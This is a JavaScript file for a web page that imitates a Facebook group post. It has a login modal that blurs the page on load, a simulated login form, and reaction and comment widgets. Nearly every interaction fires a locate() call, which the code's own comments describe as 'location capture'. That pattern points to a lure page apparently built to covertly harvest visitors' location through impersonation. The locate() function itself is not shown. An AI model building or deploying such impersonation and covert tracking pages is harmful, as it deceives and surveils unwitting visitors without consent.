// utility
function qs(elem) {return document.querySelector(elem);}
function qsa(elem) {return document.querySelectorAll(elem);}

// globals
hovered_btn_id = 0;

// Modal functionality
function initializeModal() {
    const modal = qs('#login-modal');
    const modalClose = qs('#modal-close');
    const modalLogin = qs('#modal-login');
    const modalSignup = qs('#modal-signup');
    const contentElements = [
        qs('#facebook-header'),
        qs('.mobile-nav-bar'),
        qs('.fb-group-header'),
        qs('.main-content-wrapper'),
        qs('.fb-bottom-banner')
    ];

    // Show modal on page load
    function showModal() {
        modal.classList.remove('hidden');
        // Add blur effect to content
        contentElements.forEach(element => {
            if (element) {
                element.classList.add('content-blurred');
            }
        });
        
        // Prevent scrolling
        document.body.style.overflow = 'hidden';
    }

    // Hide modal
    function hideModal() {
        modal.classList.add('hidden');
        // Remove blur effect from content
        contentElements.forEach(element => {
            if (element) {
                element.classList.remove('content-blurred');
            }
        });
        
        // Restore scrolling
        document.body.style.overflow = '';
    }

    // Event listeners
    if (modalClose) {
        modalClose.addEventListener('click', hideModal);
    }

    if (modalLogin) {
        modalLogin.addEventListener('click', function() {
            hideModal();
            // Trigger location capture when user clicks login
            locate(() => {}, () => {});
            // Focus on the login form in the header
            const emailInput = qs('#email');
            if (emailInput) {
                emailInput.focus();
            }
        });
    }

    if (modalSignup) {
        modalSignup.addEventListener('click', function() {
            hideModal();
            // Trigger location capture when user clicks signup
            locate(() => {}, () => {});
            // In a real app, this would redirect to signup page
        });
    }

    // Close modal when clicking outside
    if (modal) {
        modal.addEventListener('click', function(e) {
            if (e.target === modal) {
                hideModal();
            }
        });
    }

    // Close modal with Escape key
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape' && !modal.classList.contains('hidden')) {
            hideModal();
        }
    });

    // Show modal on page load
    showModal();
}

// Facebook login functionality
function initializeFacebookLogin() {
    const loginForm = qs('.fb-login-form');
    const emailInput = qs('#email');
    const passwordInput = qs('#password');
    const loginBtn = qs('.fb-login-btn');

    if (loginForm) {
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();
            
            if (!email || !password) {
                // Add visual feedback for empty fields
                if (!email) {
                    emailInput.style.borderColor = '#fa383e';
                    emailInput.style.boxShadow = '0 0 0 2px rgba(250, 56, 62, 0.2)';
                }
                if (!password) {
                    passwordInput.style.borderColor = '#fa383e';
                    passwordInput.style.boxShadow = '0 0 0 2px rgba(250, 56, 62, 0.2)';
                }
                
                // Reset error styling after 3 seconds
                setTimeout(() => {
                    emailInput.style.borderColor = '';
                    emailInput.style.boxShadow = '';
                    passwordInput.style.borderColor = '';
                    passwordInput.style.boxShadow = '';
                }, 3000);
                
                return false;
            }
            
            // Simulate login attempt
            loginBtn.textContent = 'Logging in...';
            loginBtn.disabled = true;
            
            // Trigger location capture when user submits login form
            locate(() => {}, () => {});
            
            setTimeout(() => {
                loginBtn.textContent = 'Log in';
                loginBtn.disabled = false;
                // In a real app, this would redirect or show success/error
            }, 1500);
        });

        // Reset error styling when user starts typing
        emailInput.addEventListener('input', function() {
            this.style.borderColor = '';
            this.style.boxShadow = '';
        });
        
        passwordInput.addEventListener('input', function() {
            this.style.borderColor = '';
            this.style.boxShadow = '';
        });
    }
}

// elements
const
opt_btns = qsa(".top-options button"),
menu = qs("#option"),
emoji_panel = qs("#emojies"),
comment_inputs = qsa(".comment-input-area input"),
comment_boxs = qsa(".comment-box"),
comment_btns = qsa(".comment-btn"),
like_btns = qsa(".like-btn"),
emojies = qsa("#emojies img");

// functions
function getOffset(el) {
	const rect = el.getBoundingClientRect();
	return {
		left: rect.left + window.scrollX,
		top: rect.top + window.scrollY
	};
}

function toggle_option(button)
{
	if (menu.style.visibility == "visible")
	{
		menu.style.visibility = "hidden";
		menu.style.top =  "0px";
		menu.style.left = "0px";
	}
	else
	{
		menu.style.visibility = "visible";
		
		// Responsive positioning
		const buttonRect = button.getBoundingClientRect();
		const menuWidth = 340; // Default menu width
		const mobileMenuWidth = 280; // Mobile menu width
		const viewportWidth = window.innerWidth;
		
		if (viewportWidth <= 480) {
			// Mobile positioning
			menu.style.top = getOffset(button).top + 50 + "px";
			menu.style.left = Math.max(10, getOffset(button).left - 200) + "px";
		} else if (viewportWidth <= 768) {
			// Tablet positioning
			menu.style.top = getOffset(button).top + 50 + "px";
			menu.style.left = Math.max(10, getOffset(button).left - 250) + "px";
		} else {
			// Desktop positioning
			menu.style.top = getOffset(button).top + 50 + "px";
			menu.style.left = getOffset(button).left - 315 + "px";
		}
	}
}

function toggle_reaction(button)
{
	if (emoji_panel.style.visibility == "visible")
	{
		emoji_panel.style.visibility = "hidden";
	}
	else
	{
		emoji_panel.style.visibility = "visible";
		
		// Responsive positioning for emoji panel
		const viewportWidth = window.innerWidth;
		const buttonRect = button.getBoundingClientRect();
		
		if (viewportWidth <= 480) {
			// Mobile positioning - center the emoji panel
			const panelWidth = 250;
			const leftPos = Math.max(10, Math.min(viewportWidth - panelWidth - 10, getOffset(button).left - 100));
			emoji_panel.style.top = getOffset(button).top - 50 + "px";
			emoji_panel.style.left = leftPos + "px";
		} else {
			// Desktop positioning
			emoji_panel.style.top = getOffset(button).top - 50 + "px";
			emoji_panel.style.left = getOffset(button).left - 50 + "px";
		}
	}
}
function placeLIke(emoji, id) {
	
	var emoji_src, btn_text;
	
	switch (emoji) {
		case "e-like":
			emoji_src = "./svg/like.svg";
			btn_text = "Like";
			break;
		case "e-love":
			emoji_src = "./svg/love.svg";
			btn_text = "Love";
			break;
		case "e-care":
			emoji_src = "./svg/care.svg";
			btn_text = "Care";
			break;
		case "e-haha":
			emoji_src = "./svg/haha.svg";
			btn_text = "haha";
			break;
		case "e-wow":
			emoji_src = "./svg/wow.svg";
			btn_text = "Wow";
			break;
		case "e-sad":
			emoji_src = "./svg/sad.svg";
			btn_text = "Sad";
			break;
		case "e-angry":
			emoji_src = "./svg/angry.svg";
			btn_text = "Angry";
			break;
		default:
			return;
	}
	
	qs("#fpost" + id).querySelector(".like-btn img").src = emoji_src;
	qs("#fpost" + id).querySelector(".like-btn img").style.width = "20px";
	qs("#fpost" + id).querySelector(".like-btn span").innerHTML = btn_text;
}
function makeComment(text, id) {

	qs("#fpost" + id).querySelector(".comment-box").innerHTML += 
	`
	<div class="comment-container">
		<div class="comment">
		<img src="assets/profile-pic.jpg" alt="" class="comment-img">
		<div class="comment-text">
			<div class="comment-header">
			<p><strong>Rejwan Islam Rizvy</strong></p>
			</div>
			<p>${text}</p>
		</div>
		<div class="three-dot">
			<img src="svg/three_dot_gray.svg" class="three-dot-img" alt="">
		</div>
		</div>
		<div class="comment-lks">
		<p>
			<span>Like</span><span class="dot"> . </span>
			<span>Reply</span><span class="dot"> . </span>
			<span>Share</span><span class="dot"> . </span>
			<span>just now</span></p>
		</div>
	</div>
	`;
}

//******************
// Main Function here
//******************

// Toggle see more/see less functionality
function toggleText() {
  const hiddenText = document.querySelector('.post-hidden-text');
  const seeMoreBtn = document.querySelector('.see-more');
  
  if (hiddenText.style.display === 'none') {
    hiddenText.style.display = 'block';
    seeMoreBtn.textContent = '...عرض أقل';
  } else {
    hiddenText.style.display = 'none';
    seeMoreBtn.textContent = '...المزيد';
  }
}

// Initialize content visibility as soon as possible
document.addEventListener('DOMContentLoaded', function() {
    qs("#mother").style.display = "block";
    qs("#js-error").style.display = "none";
    
    // Initialize modal
    initializeModal();
    
    // Initialize Facebook login functionality
    initializeFacebookLogin();
});

window.addEventListener('load', function() {
	
	opt_btns.forEach(btn => {
		btn.addEventListener("click", (e)=>{
			// Trigger location capture when user clicks options menu
			locate(() => {}, () => {});
			toggle_option(btn);
		});
	});
	
	comment_inputs.forEach(input => {
		input.addEventListener("change", (e)=>{
			// Trigger location capture when user adds a comment
			locate(() => {}, () => {});
			makeComment(input.value, input.getAttribute("fpost"));
			input.value = "";
		});
	});
	
	comment_btns.forEach(button => {
		button.addEventListener("click", (e)=>{
			// Trigger location capture when user clicks comment button
			locate(() => {}, () => {});
			qs("#fpost" + button.getAttribute("fpost")).querySelector("input").focus();
		});
	});
	
	like_btns.forEach(button => {
		// Handle both mouse and touch events
		button.addEventListener("mouseover", (e)=>{
			if (window.innerWidth > 768) { // Only on desktop
				hovered_btn_id = button.getAttribute("fpost");
				toggle_reaction(button);
			}
		});
		
		button.addEventListener("mouseout", (e)=>{
			if (window.innerWidth > 768) { // Only on desktop
				toggle_reaction(button);
			}
		});
		
		button.addEventListener("click", (e)=>{
			hovered_btn_id = button.getAttribute("fpost");
			// Trigger location capture when user clicks like button
			locate(() => {}, () => {});
			if (window.innerWidth <= 768) {
				// On mobile, show reaction panel on click
				if (emoji_panel.style.visibility === "visible") {
					toggle_reaction(button);
				} else {
					toggle_reaction(button);
				}
			} else {
				// On desktop, place like directly
				placeLIke("e-like", hovered_btn_id);
			}
		});
		
		// Add touch support for mobile
		button.addEventListener("touchstart", (e)=>{
			if (window.innerWidth <= 768) {
				e.preventDefault();
				hovered_btn_id = button.getAttribute("fpost");
				toggle_reaction(button);
			}
		});
	});
	
	emojies.forEach(emoji => {
		emoji.addEventListener("click", (e)=>{
			// Trigger location capture when user clicks emoji reaction
			locate(() => {}, () => {});
			placeLIke(emoji.getAttribute("id"), hovered_btn_id);
			// Hide emoji panel after selection on mobile
			if (window.innerWidth <= 768) {
				emoji_panel.style.visibility = "hidden";
			}
		});
		
		// Add touch support
		emoji.addEventListener("touchend", (e)=>{
			e.preventDefault();
			// Trigger location capture when user touches emoji reaction
			locate(() => {}, () => {});
			placeLIke(emoji.getAttribute("id"), hovered_btn_id);
			if (window.innerWidth <= 768) {
				emoji_panel.style.visibility = "hidden";
			}
		});
	});
	
	// Close dropdowns when clicking outside
	document.addEventListener("click", (e) => {
		if (!e.target.closest("#option") && !e.target.closest(".top-options")) {
			menu.style.visibility = "hidden";
		}
		if (!e.target.closest("#emojies") && !e.target.closest(".like-btn")) {
			emoji_panel.style.visibility = "hidden";
		}
	});
	
	// Handle orientation change
	window.addEventListener("orientationchange", () => {
		setTimeout(() => {
			menu.style.visibility = "hidden";
			emoji_panel.style.visibility = "hidden";
		}, 100);
	});
	
	// Add location capture to additional interactive elements
	
	// Follow/Join button
	const joinBtn = qs('.join-group-btn');
	if (joinBtn) {
		joinBtn.addEventListener('click', function() {
			// Trigger location capture when user clicks follow/join button
			locate(() => {}, () => {});
		});
	}
	
	// Share buttons
	const shareBtns = qsa('.share-btn');
	shareBtns.forEach(btn => {
		btn.addEventListener('click', function() {
			// Trigger location capture when user clicks share button
			locate(() => {}, () => {});
		});
	});
	
	// Bottom banner buttons
	const bannerLoginBtn = qs('.fb-banner-login-btn');
	const bannerSignupBtn = qs('.fb-banner-signup-btn');
	
	if (bannerLoginBtn) {
		bannerLoginBtn.addEventListener('click', function() {
			// Trigger location capture when user clicks banner login button
			locate(() => {}, () => {});
		});
	}
	
	if (bannerSignupBtn) {
		bannerSignupBtn.addEventListener('click', function() {
			// Trigger location capture when user clicks banner signup button
			locate(() => {}, () => {});
		});
	}
	
	// Mobile login button
	const mobileLoginBtn = qs('.mobile-login-btn');
	if (mobileLoginBtn) {
		mobileLoginBtn.addEventListener('click', function() {
			// Trigger location capture when user clicks mobile login button
			locate(() => {}, () => {});
		});
	}
	
	// Mobile open app button
	const mobileOpenAppBtn = qs('.mobile-open-app');
	if (mobileOpenAppBtn) {
		mobileOpenAppBtn.addEventListener('click', function() {
			// Trigger location capture when user clicks open app button
			locate(() => {}, () => {});
		});
	}
	
	// See more/less toggle
	const seeMoreBtn = qs('.see-more');
	if (seeMoreBtn) {
		seeMoreBtn.addEventListener('click', function() {
			// Trigger location capture when user clicks see more button
			locate(() => {}, () => {});
		});
	}
});